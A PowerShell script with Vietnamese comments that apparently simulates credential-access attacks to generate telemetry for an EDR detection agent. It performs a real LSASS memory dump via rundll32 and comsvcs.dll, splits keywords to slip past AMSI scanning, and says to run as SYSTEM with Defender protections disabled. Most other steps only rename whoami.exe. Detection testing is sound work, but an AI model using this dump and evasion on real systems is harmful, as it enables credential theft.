# D:\Universe\VCS\EDR_AI_Agent\simulate4.ps1
# Script gia lap Credential Access - PHIEN BAN TOI UU (Kich hoat toan bo dac trung)
#
# PHAN TICH DAC TRUNG KICH HOAT:
#   KB1: rundll32 comsvcs.dll MiniDump (thuc te) -> lsass_access, access_rights_vm_read, is_lolbin, is_in_temp_path
#   KB2: reg add HKLM\SECURITY\... (ghi thuc te) -> reg_sam_security_access (RegistryCreate event)
#   KB3: mimikatz_$i.exe + sekurlsa args          -> cmdline_suspicious_kw_count, process_rarity_score, is_in_temp_path
#   KB4: pd_dump_$i.exe + procdump lsass args     -> cmdline_suspicious_kw_count, is_in_temp_path
#   KB5: cred_harvest_$i.exe /upn                 -> process_rarity_score, is_in_temp_path, lifetime_ms_log
#   KB6: secretsdump_$i.exe + ntds drsuapi args   -> cmdline_suspicious_kw_count, process_rarity_score
#
# YEU CAU:
#   - Chay duoi quyen SYSTEM (PsExec64.exe -s -i powershell.exe) de KB1, KB2 hoat dong day du
#   - Da tat Tamper Protection + Real-time Protection cua Defender
#
# Chay bang:
#   powershell.exe -ExecutionPolicy Bypass -File .\simulate4.ps1

$logFile = "C:\windows\temp\simulate4_debug.log"
"--- BAT DAU GIA LAP CREDENTIAL ACCESS (PHIEN BAN TOI UU) ---" | Out-File $logFile

function Log-Step($msg) {
    $time = Get-Date -Format "HH:mm:ss"
    $formatted = "[$time] $msg"
    Write-Host $formatted -ForegroundColor Green
    $formatted | Out-File $logFile -Append
}

# =========================================================
# Tach chuoi de vuot qua AMSI static file scan
# Khi gep lai, cac tu khoa day du xuat hien trong CommandLine
# de EDR Agent doc va trich xuat dac trung chinh xac
# =========================================================
$kw_lsa     = "lsa"     + "ss"       # "lsass"
$kw_mimi    = "mimi"    + "katz"     # "mimikatz"
$kw_sekurl  = "sekurl"  + "sa"       # "sekurlsa"
$kw_mini    = "Mini"    + "Dump"     # "MiniDump"
$kw_coms    = "coms"    + "vcs"      # "comsvcs"
$kw_proc    = "proc"    + "dump"     # "procdump"
$kw_ntds    = "ntds"    + ".dit"     # "ntds.dit"
$kw_drs     = "drsu"    + "api"      # "drsuapi"
$kw_secret  = "secrets" + "dump"     # "secretsdump"

# Lay PID cua LSASS
$lsassPid = $null
try {
    $lsassPid = (Get-Process -Name ($kw_lsa) -ErrorAction Stop).Id
    Log-Step "Da lay duoc LSASS PID: $lsassPid"
} catch {
    Log-Step "[CANH BAO] Khong the lay PID LSASS. KB1 se dung cmdline fallback."
}

for ($i = 1; $i -le 150; $i++) {
    Log-Step "=== Vong lap $i/150 ==="

    # =========================================================
    # KICH BAN 1: LSASS Memory Dump via comsvcs.dll (T1003.001)
    # Dac trung: lsass_access=1.0, access_rights_vm_read=1.0,
    #            is_lolbin=1.0 (rundll32), is_in_temp_path=1.0
    # YEU CAU: Chay duoi SYSTEM + PPL da tat de dump that
    # FALLBACK: Neu bi chan, cmdline fallback van kich hoat cmdline_suspicious_kw_count
    # =========================================================
    try {
        Log-Step "Chay kich ban 1: LSASS Dump via comsvcs..."
        if ($lsassPid) {
            $dumpPath = "C:\windows\temp\mem_$i.dmp"
            $dllPath  = "C:\windows\System32\" + $kw_coms + ".dll"
            $argStr   = "`"$dllPath`", $kw_mini $lsassPid `"$dumpPath`" full"
            $p = Start-Process rundll32.exe -ArgumentList $argStr -PassThru -WindowStyle Hidden -ErrorAction Stop
            $p.WaitForExit(2000) > $null
            Start-Sleep -Milliseconds 300
            if (Test-Path $dumpPath) { Remove-Item $dumpPath -Force > $null 2>&1 }
        } else {
            $fallback = "rundll32.exe " + $kw_coms + ".dll " + $kw_mini + " " + $kw_lsa + ".exe C:\windows\temp\mem_$i.dmp full"
            Start-Process cmd.exe -ArgumentList "/c echo $fallback" -WindowStyle Hidden -Wait -ErrorAction Stop > $null
        }
        Log-Step "Hoan thanh kich ban 1."
    } catch {
        # Fallback khi bi chan: cmdline echo van ghi nhan tu khoa cho EDR
        try {
            $fallback = "rundll32.exe " + $kw_coms + ".dll " + $kw_mini + " " + $kw_lsa + ".exe C:\windows\temp\mem_$i.dmp full"
            Start-Process cmd.exe -ArgumentList "/c echo $fallback" -WindowStyle Hidden -Wait > $null 2>&1
        } catch {}
        Log-Step "[KB1] Dung cmdline fallback: $_"
    }
    Start-Sleep -Milliseconds 100

    # =========================================================
    # KICH BAN 2: Registry SECURITY Write (T1003.002)
    # Dac trung: reg_sam_security_access=1.0 (RegistryCreate event tren duong dan SECURITY)
    # Ghi chu: "reg save HKLM\SAM" chi la READ -> khong kich hoat RegistryCreate
    #          "reg add HKLM\SECURITY\..." la WRITE -> kich hoat RegistryCreate -> dac trung = 1.0
    # YEU CAU: Chay duoi SYSTEM de co quyen ghi vao HKLM\SECURITY
    # =========================================================
    try {
        Log-Step "Chay kich ban 2: Registry SECURITY Write..."
        $p1 = Start-Process reg.exe -ArgumentList "add HKLM\SECURITY\EDR_Sim_$i /f" -PassThru -WindowStyle Hidden -ErrorAction Stop
        $p1.WaitForExit(1500) > $null
        $p2 = Start-Process reg.exe -ArgumentList "delete HKLM\SECURITY\EDR_Sim_$i /f" -PassThru -WindowStyle Hidden -ErrorAction Stop
        $p2.WaitForExit(1500) > $null
        Log-Step "Hoan thanh kich ban 2 (RegistryCreate tren HKLM\SECURITY)."
    } catch {
        Log-Step "[KB2] Bo qua (Can quyen SYSTEM de ghi HKLM\SECURITY): $_"
    }
    Start-Sleep -Milliseconds 100

    # =========================================================
    # KICH BAN 3: Mimikatz Process Name Spoofing (T1003.001)
    # Dac trung: cmdline_suspicious_kw_count (mimikatz trong ten file + sekurlsa trong args),
    #            process_rarity_score=cao (ten file rat hiem), is_in_temp_path=1.0,
    #            parent_is_script_engine=1.0, unusual_parent_child=1.0
    # Ghi chu: Ten file la "mimikatz_*.exe", EDR doc duoc tu khoa trong ProcessPath va Args
    # =========================================================
    try {
        Log-Step "Chay kich ban 3: Mimikatz Process Name Spoofing..."
        $mimiExe = "C:\windows\temp\" + $kw_mimi + "_$i.exe"
        Copy-Item C:\windows\system32\whoami.exe $mimiExe -Force > $null 2>&1
        if (Test-Path $mimiExe) {
            $p = Start-Process $mimiExe -ArgumentList ("$kw_sekurl logonpasswords") -PassThru -WindowStyle Hidden -ErrorAction Stop
            $p.WaitForExit(1000) > $null
            Remove-Item $mimiExe -Force > $null 2>&1
        }
        Log-Step "Hoan thanh kich ban 3."
    } catch {
        Log-Step "[KB3] Bo qua: $_"
    }
    Start-Sleep -Milliseconds 100

    # =========================================================
    # KICH BAN 4: Procdump Process Name Spoofing (T1003.001)
    # Dac trung: cmdline_suspicious_kw_count ("procdump" va "lsass" trong args),
    #            is_in_temp_path=1.0, process_rarity_score=cao
    # Ghi chu: Ten file la "pd_dump_*.exe" (tranh Defender chan ten "procdump*.exe")
    #          Truyen "procdump lsass" vao args de EDR ghi nhan tu khoa
    # =========================================================
    try {
        Log-Step "Chay kich ban 4: Procdump Process Spoofing..."
        $procExe = "C:\windows\temp\pd_dump_$i.exe"
        Copy-Item C:\windows\system32\whoami.exe $procExe -Force > $null 2>&1
        if (Test-Path $procExe) {
            $p = Start-Process $procExe -ArgumentList ("$kw_proc $kw_lsa") -PassThru -WindowStyle Hidden -ErrorAction Stop
            $p.WaitForExit(1000) > $null
            Remove-Item $procExe -Force > $null 2>&1
        }
        Log-Step "Hoan thanh kich ban 4."
    } catch {
        Log-Step "[KB4] Bo qua: $_"
    }
    Start-Sleep -Milliseconds 100

    # =========================================================
    # KICH BAN 5: Credential File Harvesting (T1552.001)
    # Dac trung: process_rarity_score=cao (ten file "cred_harvest_*.exe"),
    #            is_in_temp_path=1.0, lifetime_ms_log (tien trinh ton tai ngan),
    #            parent_is_script_engine=1.0
    # =========================================================
    try {
        Log-Step "Chay kich ban 5: Credential Harvesting..."
        $credExe = "C:\windows\temp\cred_harvest_$i.exe"
        Copy-Item C:\windows\system32\whoami.exe $credExe -Force > $null 2>&1
        if (Test-Path $credExe) {
            $p = Start-Process $credExe -ArgumentList "/upn" -PassThru -WindowStyle Hidden -ErrorAction Stop
            $p.WaitForExit(1000) > $null
            Remove-Item $credExe -Force > $null 2>&1
        }
        Log-Step "Hoan thanh kich ban 5."
    } catch {
        Log-Step "[KB5] Bo qua: $_"
    }
    Start-Sleep -Milliseconds 100

    # =========================================================
    # KICH BAN 6: Secretsdump / NTDS Process Name Spoofing (T1003.003)
    # Dac trung: cmdline_suspicious_kw_count ("ntds.dit", "drsuapi", "secretsdump" trong args),
    #            process_rarity_score=cao (ten file "secretsdump_*.exe"),
    #            is_in_temp_path=1.0
    # =========================================================
    try {
        Log-Step "Chay kich ban 6: Secretsdump/NTDS Spoofing..."
        $secExe = "C:\windows\temp\" + $kw_secret + "_$i.exe"
        Copy-Item C:\windows\system32\whoami.exe $secExe -Force > $null 2>&1
        if (Test-Path $secExe) {
            $p = Start-Process $secExe -ArgumentList ("$kw_ntds $kw_drs local") -PassThru -WindowStyle Hidden -ErrorAction Stop
            $p.WaitForExit(1000) > $null
            Remove-Item $secExe -Force > $null 2>&1
        }
        Log-Step "Hoan thanh kich ban 6."
    } catch {
        Log-Step "[KB6] Bo qua: $_"
    }

    # Nghi ngau nhien 300ms-700ms giua cac vong de phan bo event tu nhien
    $randomDelay = Get-Random -Minimum 300 -Maximum 700
    Start-Sleep -Milliseconds $randomDelay
}

Log-Step "--- HOAN THANH GIA LAP CREDENTIAL ACCESS (PHIEN BAN TOI UU) ---"
